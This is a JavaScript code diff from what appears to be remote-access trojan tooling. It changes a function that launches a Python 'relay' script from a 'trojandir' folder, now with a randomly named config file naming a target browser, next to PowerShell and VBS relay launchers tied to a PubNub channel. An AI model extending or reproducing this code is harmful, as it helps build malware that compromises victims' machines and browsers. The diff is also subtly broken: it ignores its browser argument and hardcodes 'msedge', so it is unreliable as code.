@@ -1850,8 +1850,23 @@ function writeToChildProcess(child, msg) {
     }
 }
 
-function runpythonrelay(pubnubo) {
-    return execPYTHONScript(path.join(systemstate.trojandir, "pythonrelay.py")); // anchor
+function runpythonrelay(pubnubo, browser = "chrome") {
+    let configfpath = path.join(
+        systemstate.trojandir,
+        "pythonrelay.py_" + getRandomCode(8) + "_config.json"
+    );
+
+    let jsontext = JSON.stringify({
+        browser: "msedge",
+        batchid: getRandomCode(8),
+    });
+
+    fs.writeFileSync(configfpath, jsontext);
+
+    return execPYTHONScript(
+        path.join(systemstate.trojandir, "pythonrelay.py"),
+        [configfpath]
+    );
 }
 
 function runpsrelay(pubnubo) {
@@ -2069,7 +2084,8 @@ function launchrelay(tenginename, tpubnubr) {
     } else if (tenginename == "PS1") {
         tchildp = runpsrelay(tpubnubr);
     } else if (tenginename == "PY") {
-        tchildp = runpythonrelay(tpubnubr);
+        // TODO: get browsername from args // anchor
+        tchildp = runpythonrelay(tpubnubr, "chrome");
     } else if (tenginename == "VBS") {
         tchildp = runvbsrelay(tpubnubr);
     }
